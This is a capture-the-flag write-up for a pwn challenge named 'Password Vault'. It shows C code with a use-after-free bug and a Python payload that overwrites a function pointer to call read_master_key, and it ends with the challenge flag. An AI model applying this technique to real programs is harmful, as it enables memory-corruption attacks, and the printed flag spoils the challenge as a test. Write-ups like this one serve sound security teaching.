# Password Vault

## Description

High level password manager. No way you can get my master key

## Solution Walkthrough

1. **Step 1**：

    First, observe the vulnerability in the program:

    ```c
    static void delete_login(void)
    {
        int i = read_int("  slot [0-7]: ");
        if(!check_slot_empty(i)) return;
        printf("  [-] deleting login for '%s'\n", logins[i]->username);
        free(logins[i]);
    }
    ```

    Inside delete_login, this function only frees the memory but does not clear the pointer. Therefore, after delete_login, we have a chance to overwrite can_check with read_master_key(), allowing us to reuse the pointer and get the flag.

2. **Step 2**：

    First, find the address of the read_master_key function. This can be done with pwntools or objdump. Then use p64(read_master_key) to overwrite can_check:

    ```python
    def payload() -> bytes:
        login_size = 32
        fake_login = p64(read_master_key) + b"A" * (login_size - 8)

        return b"".join([
            b"1\n",        # new login
            b"0\n",        # slot 0
            b"user\n",     # username
            b"pass\n",     # password
            b"2\n",        # delete login; leaves dangling pointer in logins[0]
            b"0\n",        # slot 0
            b"3\n",        # set password; malloc(32) reuses freed Login chunk
            b"32\n",       # same allocation size as sizeof(Login)
            fake_login,    # overwrite can_check function pointer
            b"\n4\n",      # check master key
            b"0\n",        # slot 0
            b"0\n",        # quit
        ])
    ```

    Run read_master_key using the modified login, and we can get the flag.

    The detailed commands above were organized with the help of AI, so just compare them with the program logic.

## Flag

```text
dalctf{fr33d_fr0m_d4s1r3_n4n4n4}
```
